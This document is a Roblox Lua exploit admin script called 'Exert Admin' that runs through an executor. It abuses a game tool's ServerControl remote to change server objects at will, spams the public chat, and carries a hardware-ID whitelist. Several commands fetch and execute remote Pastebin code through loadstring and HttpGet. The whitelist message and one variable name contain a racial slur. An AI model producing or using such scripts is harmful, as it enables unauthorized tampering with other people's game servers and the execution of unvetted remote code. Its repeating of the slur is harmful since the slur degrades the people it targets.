
--cmds
--.orbvis
--.m1
--.block
--.bspam 
--.rtag
--.kleg
--.cvis
--.rvis
--.bvis
--.bypass
--.jaylen
--.lightred ---AURA
--.lightpink ---AURA
--.lightgreen ---AURA
--.rhead
--.exert
-----------------------------------------------PREFIX IS "."--------------------------------------------------------------------------
local http_request = syn and syn.request or request;
local hwidPaste = loadstring(game:HttpGet("https://pastebin.com/raw/FW34nbcD"))()

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService("HttpService"):JSONDecode(body)
local hwid = decoded.headers['Syn-Fingerprint']

for i, v in pairs(hwidPaste) do
    if v == hwid then
        print("Whitelisted")
        else
            print("Not Whitelisted u nigger")
            disconnect()
    end
end

setclipboard(hwid)



local args = {
    [1] = "Loading...",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 wait(0.6)
 

local args = {
    [1] = "Loading...",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait(0.6)
game:GetService("StarterGui"):SetCore("SendNotification", { 
    Title = "Exert Hub";
    Text = "jaylen#0001 was here!";
    Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 16;


local args = {
    [1] = "Injection Sucessful.",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait(0.4)




local args = {
    [1] = "Jaylen and Steven were here",
    [2] = "All"
    
}
wait(0.2)

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))



wait(0.3)

local args = {
    [1] = "Made by jaylen#0001",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-----------------------------------------------------------------------------------------------------------
                        --Exert Admin Made By Jepp.




local prefix = "."
local LPlayer = game.Players.LocalPlayer
LPlayer.Chatted:Connect(function(msg)
	msg = msg:lower()
	if string.sub(msg,1,3) == "/e " then
		msg = string.sub(msg,4)
	end
	if string.sub(msg,1,1) == prefix then
		local cmd
		local space = string.find(msg," ")
		if space then
			cmd = string.sub(msg,2,space-1)
		else
			cmd = string.sub(msg,2)
		end
		
		if cmd == "print" then
			local var = string.sub(msg,space+1)
			print(var)
		end
		if cmd == "lightblue" then
			--Change the color RIGHT UNDER HERE
local Colors = shared.Colors or {
	Red = 0,
	Green = 0,
	Blue = 255
}
local ME = game:GetService("Players").LocalPlayer
function M16(arg1, arg2, arg3, arg4)
	if arg1 and type(arg1) ~= "string" and arg1:IsA("Instance") then
		arg1, arg2, arg3, arg4 = "PompousTheCloud", arg1, arg2, arg3
	end
	local cItem = ME.Character:FindFirstChild(arg1)
	if not cItem or not cItem:FindFirstChild("ServerControl") or not cItem:FindFirstChild("ServerControl"):IsA("RemoteFunction") then
		return warn("Invalid tool '" .. arg1 .. "', missing 'ServerControl' or 'ServerControl' isn't 'RemoteFunction'!")
	end
	if type(arg3) == "table" then
		for i, v in pairs(arg3) do
			cItem.ServerControl:InvokeServer("SetProperty", {
				Value = v,
				Property = i,
				Object = arg2
			})
		end
	elseif type(arg3) ~= "table" then
		cItem.ServerControl:InvokeServer("SetProperty", {
			Value = arg4,
			Property = arg3,
			Object = arg2
		})
	end
	return arg2
end
if ME.Backpack:FindFirstChild("PompousTheCloud") then
	ME.Backpack:FindFirstChild("PompousTheCloud").Parent = ME.Character
end
local Cloud = ME.Character:WaitForChild("PompousTheCloud")
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld1"
})
game:GetService("ReplicatedStorage").AvatarEditor.HatHandle:FireServer(33171947)
M16(ME.Character:WaitForChild(33171947).Handle.NeckAttachment, "Parent", ME.Character.Head)
ME.Character:WaitForChild(33171947):Destroy()
ME.Character:WaitForChild("BlingNecklace"):Destroy()
M16(ME.Character.Head:WaitForChild("NeckAttachment"), {
	Orientation = Vector3.new(0, 0, 0),
	Position = Vector3.new(-.15, .2, -.5),
	Axis = Vector3.new(1, 0, 0),
	SecondaryAxis = Vector3.new(0, 1, 0),
	Archivable = true,
	Name = "EpikEyeWeld2"
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE1",
	Parent = ME.Character.Head.EpikEyeWeld1
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new(.5),
	Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.079, .372, 0),
		NumberSequenceKeypoint.new(.296, 0, 0),
		NumberSequenceKeypoint.new(.668, 0, 0),
		NumberSequenceKeypoint.new(.85, .306, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = .3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.1, .1),
	Rate = 150,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(0, 0)
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikEYE2",
	Parent = ME.Character.Head.EpikEyeWeld2
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 5, 1),
		NumberSequenceKeypoint.new(1, 5, 1)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0, 0),
		NumberSequenceKeypoint.new(.0411, 0, 0),
		NumberSequenceKeypoint.new(.078, .995, 0),
		NumberSequenceKeypoint.new(.111, 0, 0),
		NumberSequenceKeypoint.new(.135, .989, 0),
		NumberSequenceKeypoint.new(.164, 0, 0),
		NumberSequenceKeypoint.new(.303, 0, 0),
		NumberSequenceKeypoint.new(.391, 0, 0),
		NumberSequenceKeypoint.new(.416, 1, 0),
		NumberSequenceKeypoint.new(.453, 0, 0),
		NumberSequenceKeypoint.new(.551, 0, 0),
		NumberSequenceKeypoint.new(.577, .995, 0),
		NumberSequenceKeypoint.new(.595, 0, 0),
		NumberSequenceKeypoint.new(.694, 0, 0),
		NumberSequenceKeypoint.new(.743, 1, 0),
		NumberSequenceKeypoint.new(.793, 0, 0),
		NumberSequenceKeypoint.new(1, 0, 0)
	}),
	ZOffset = 3,
	Archivable = true,
	Acceleration = Vector3.new(0, 0, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.2, .3),
	Rate = 7,
	Rotation = NumberRange.new(0, 360),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(0, 0),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikLightning",
	Parent = ME.Character.Torso
})
workspace.Effect:FireServer("Pixel")
M16(ME.Character.HumanoidRootPart:WaitForChild("Pixel"), {
	Color = ColorSequence.new(Color3.fromRGB(tonumber(Colors.Red), tonumber(Colors.Green), tonumber(Colors.Blue))),
	LightEmission = 0,
	LightInfluence = 0,
	Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 4.81, .875),
		NumberSequenceKeypoint.new(1, 2.13, .875)
	}),
	Texture = "rbxassetid://567502351",
	Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1, 0),
		NumberSequenceKeypoint.new(.059, .945, 0),
		NumberSequenceKeypoint.new(.39, .951, 0),
		NumberSequenceKeypoint.new(.702, .978, 0),
		NumberSequenceKeypoint.new(1, 1, 0)
	}),
	ZOffset = -2,
	Archivable = true,
	Acceleration = Vector3.new(0, 25, 0),
	Drag = 0,
	LockedToPart = true,
	VelocityInheritance = .5,
	EmissionDirection = Enum.NormalId.Top,
	Enabled = true,
	Lifetime = NumberRange.new(.75, 1),
	Rate = 50,
	Rotation = NumberRange.new(-5, 5),
	RotSpeed = NumberRange.new(0, 0),
	Speed = NumberRange.new(5, 5),
	SpreadAngle = Vector2.new(360, 360),
})
M16(ME.Character.HumanoidRootPart.Pixel, {
	Name = "EpikAura",
	Parent = ME.Character.Torso
})
		end
		
		if cmd == "jaylen" then
local UserName  = game:GetService('Players').LocalPlayer.Name
local mesh = 1107038050
local texture = 5821992842
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end


game.Workspace.GiveTool:FireServer(gamepass_id, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("1374269")
MainUserW:WaitForChild("KittyEars")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"]["Mesh"],"MeshId","rbxassetid://13309079093")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"]["Mesh"],"TextureId","rbxassetid://13309054379")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"]["Mesh"],"Scale",Vector3.new(6.0, 6.0, 6.0))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Rotation",Vector3.new(0, -6300, 0))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Transparency","0.0")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Anchored",true)
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Position",Vector3.new(-15, 3981,405))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"CanCollide",false)
wait(.1)
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Size",Vector3.new(2.8, 2.8, 2.8))
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Material","Neon")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["1374269"]["Handle"],"Transparency","0")
MainUserW.KittyEars:Remove()

		end
		
		
		
			if cmd == "bvis" then
			game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet(('https://pastebin.com/raw/SK3dZiyd'),true))()
		end
		
		if cmd == "cvis" then
			 game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet(('https://pastebin.com/raw/K69JGDVM'),true))()
		end
		
		if cmd == "rvis" then
			game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet(('https://pastebin.com/raw/fV8UNbfd'),true))()
		end
		
			if cmd == "block" then
			plr = game.Players.LocalPlayer

game.Players.LocalPlayer.Character.MessyHairBrown.Handle.Mesh:Destroy()

plr = game.Players.LocalPlayer

local args = {


    [1] = "SetProperty",
    [2] = {
        ["Value"] = Vector3.new(5, 5, 5),
        ["Property"] = "Size",
        ["Object"] = game.Players.LocalPlayer.Character.MessyHairBrown.Handle

        }

}

plr.Character:WaitForChild("PompousTheCloud"):WaitForChild("ServerControl"):InvokeServer(unpack(args))

local args = {


    [1] = "SetProperty",
    [2] = {
        ["Value"] = true,
        ["Property"] = "CanCollide",
        ["Object"] = game.Players.LocalPlayer.Character.MessyHairBrown.Handle

        }

}

plr.Character:WaitForChild("PompousTheCloud"):WaitForChild("ServerControl"):InvokeServer(unpack(args))
wait(1)
local args = {
    [1] = "SetProperty",
    [2] = {
        ["Value"] = game.workspace,
        ["Property"] = "Parent",
        ["Object"] = game.Players.LocalPlayer.Character.MessyHairBrown.Handle
    }
}

plr.Character:WaitForChild("PompousTheCloud"):WaitForChild("ServerControl"):InvokeServer(unpack(args))
			end
	
		if cmd == "orbvis" then
			local nig = "100"
local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
	}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function BreakAnimation()
	for _, x in next, MainUserP.Character.Humanoid:GetPlayingAnimationTracks() do
		if not string.find(x.Animation.AnimationId, "180426354") then
			x:stop()
		end
	end
	wait()
	local DualAnimation = Instance.new("Animation")
	DualAnimation.AnimationId = "rbxassetid://1145142527"
	local DualAnimation_ = MainUserP.Character.Humanoid:LoadAnimation(DualAnimation)
	DualAnimation_:Play()
	DualAnimation_:AdjustSpeed(1)
end

function HideCloud()
	MainUserW.PompousTheCloud.ServerControl:InvokeServer("SetProperty",{["Value"]="rbxassetid://0",["Property"]="MeshId",["Object"]=MainUserW.PompousTheCloud.Handle.Mesh})
end

local VerifyCloud = function()
	if not MainUserP.Character:FindFirstChild("PompousTheCloud") and not MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		wait(0.5)
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		HideCloud()
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
			MainUserW.PompousTheCloud.ServerControl:InvokeServer("SetProperty",{["Value"]="rbxassetid://0",["Property"]="MeshId",["Object"]=MainUserW.PompousTheCloud.EffectCloud.Mesh})
		end
	elseif not MainUserP.Character:FindFirstChild("PompousTheCloud") and MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		HideCloud()
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
		end
	elseif MainUserP.Character:FindFirstChild("PompousTheCloud") then
		HideCloud()
		wait()
		BreakAnimation()
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = false})
		end
	end
end

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end

VerifyCloud()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
CE:FireEvent("PompousTheCloud",MainUserW["SuperFlyGoldBoombox"]["Handle"],"Transparency","1")
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer("14129625")wait(1)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"]["Mesh"],"Offset",Vector3.new(0,0,0.4))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"]["Mesh"],"MeshId","rbxassetid://4643937797")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Material","ForceField")
spawn(function()
game:service'RunService'.RenderStepped:connect(function()
local asd = math.floor(MainUserW["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"].PlaybackLoudness)/nig
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"]["Mesh"],"Scale",Vector3.new(asd,asd,asd))
end)
end)
while true do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(255/255,0/255,0/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(255/255,0/255,0/255))
	for i = 0,255,10 do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(255/255,i/255,0/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(255/255,i/255,0/255))
	end
	for i = 255,0,-10 do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(i/255,255/255,0/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(i/255,255/255,0/255))
	end
	for i = 0,255,10 do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(0/255,255/255,i/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(0/255,255/255,i/255))
	end
	for i = 0,255,-10 do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(0/255,i/255,255/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(0/255,i/255,255/255))
	end
	for i = 255,0,10 do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(i/255,0/255,255/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(i/255,0/255,255/255))
	end
	for i = 0,255,-10 do
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(255/255,0/255,i/255))
		CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"Color",Color3.new(255/255,0/255,i/255))
	end
	CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"BrickColor",BrickColor.new("Dark blue"))
	CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"BrickColor",BrickColor.new("Dark blue"))
	wait(2)
	CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"BrickColor",BrickColor.new("Royal purple"))
	CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"BrickColor",BrickColor.new("Royal purple"))
	wait(2)
	CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"BrickColor",BrickColor.new("Pink"))
	CE:FireEvent("PompousTheCloud", MainUserW["14129625"]["Handle"],"BrickColor",BrickColor.new("Pink"))
	wait(2)
end

		end
		
			if cmd == "srj" then
			if string.sub(l.Text,1,7)=="blackff"then 
	game.workspace.GiveTool:FireServer("7542359","PompousTheCloud")
	local C=game:GetService('Players').LocalPlayer.Name;
	local D={}
	local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
	local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
	function D:FireEvent(H,I,J,K)
	G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
	end;
	game.Workspace.GiveTool:FireServer(a,"PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
	for L,n in pairs(G:GetDescendants())do 
	if n:IsA("BasePart")then 
	D:FireEvent("PompousTheCloud",n,"Material",Enum.Material.ForceField)
	D:FireEvent("PompousTheCloud",n,"BrickColor",BrickColor.new("Really black"))
	end 
	end 
end;
			end
	
		if cmd == "rtag" then
			local ME = game:GetService("Players").LocalPlayer
function FireEvent(ItemName, Object, Property, Value)
  ME.Character:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
	}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function BreakAnimation()
	for _, x in next, MainUserP.Character.Humanoid:GetPlayingAnimationTracks() do
		if not string.find(x.Animation.AnimationId, "180426354") then
			x:stop()
		end
	end
	wait()
	local DualAnimation = Instance.new("Animation")
	DualAnimation.AnimationId = "rbxassetid://33"
	local DualAnimation_ = MainUserP.Character.Humanoid:LoadAnimation(DualAnimation)
	DualAnimation_:Play()
	DualAnimation_:AdjustSpeed(1)
end



local VerifyCloud = function()
	if not MainUserP.Character:FindFirstChild("PompousTheCloud") and not MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		wait(0.5)
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
			MainUserW.PompousTheCloud.ServerControl:InvokeServer("SetProperty",{["Value"]="rbxassetid://0",["Property"]="MeshId",["Object"]=MainUserW.PompousTheCloud.EffectCloud.Mesh})
		end
	elseif not MainUserP.Character:FindFirstChild("PompousTheCloud") and MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
		end
	elseif MainUserP.Character:FindFirstChild("PompousTheCloud") then
		
		wait()
		BreakAnimation()
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = false})
		end
	end
end

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
VerifyCloud()
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Jeppollard")
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"Size",UDim2.new(4.5, 10, 2, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.fromRGB(0, 0, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(0, 0, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"Font","Antique")

CE:FireEvent("PompousTheCloud",MainUserW.Head.NametagTemplate,"StudsOffset",Vector3.new(-2.5,3.3,0))
   
    while true do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255/255,0/255,0/255))
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255/255,i/255,0/255))
    end
    for i = 255,0,-100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(i/255,255/255,0/255))
    end
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0/255,255/255,i/255))
    end
    for i = 255,0,-100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0/255,i/255,255/255))
    end
    for i = 0,255,100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(i/255,0/255,255/255))
    end
    for i = 255,0,-100 do
    game:GetService("RunService").RenderStepped:wait()
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255/255,0/255,i/255))
    end
end
		end
		
			if cmd == "m1" then
			local ME = game:GetService("Players").LocalPlayer
function FireEvent(ItemName, Object, Property, Value)
  ME.Character:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
	}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function BreakAnimation()
	for _, x in next, MainUserP.Character.Humanoid:GetPlayingAnimationTracks() do
		if not string.find(x.Animation.AnimationId, "180426354") then
			x:stop()
		end
	end
	wait()
	local DualAnimation = Instance.new("Animation")
	DualAnimation.AnimationId = "rbxassetid://1145142527"
	local DualAnimation_ = MainUserP.Character.Humanoid:LoadAnimation(DualAnimation)
	DualAnimation_:Play()
	DualAnimation_:AdjustSpeed(1)
end



local VerifyCloud = function()
	if not MainUserP.Character:FindFirstChild("PompousTheCloud") and not MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		wait(0.5)
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
			MainUserW.PompousTheCloud.ServerControl:InvokeServer("SetProperty",{["Value"]="rbxassetid://0",["Property"]="MeshId",["Object"]=MainUserW.PompousTheCloud.EffectCloud.Mesh})
		end
	elseif not MainUserP.Character:FindFirstChild("PompousTheCloud") and MainUserP.Backpack:FindFirstChild("PompousTheCloud") then
		MainUserP.Backpack:FindFirstChild("PompousTheCloud").Parent = MainUserP.Character
		
		wait()
		BreakAnimation()
		wait(0.5)
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = true})
		end
	elseif MainUserP.Character:FindFirstChild("PompousTheCloud") then
		
		wait()
		BreakAnimation()
		if Autoride == true then
			Variables.workspace[UserName].PompousTheCloud.ServerControl:InvokeServer("Fly", {["Flying"] = false})
		end
	end
end

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
VerifyCloud()
for i,v in next, MainUserW:GetChildren() do
   if v:IsA('Accessory') then
       v:Destroy()
   end
end
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Made by Jepp")
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"Size",UDim2.new(4.5, 5, 2, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.fromRGB(0, 0, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.fromRGB(0, 0, 0))
FireEvent("PompousTheCloud",ME.Character["Head"]["NametagTemplate"]["TagText"],"Font","Arial")

CE:FireEvent("PompousTheCloud",MainUserW.Head.NametagTemplate,"StudsOffset",Vector3.new(-2.5,3.3,0))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"],"Texture","rbxassetid://134082579")
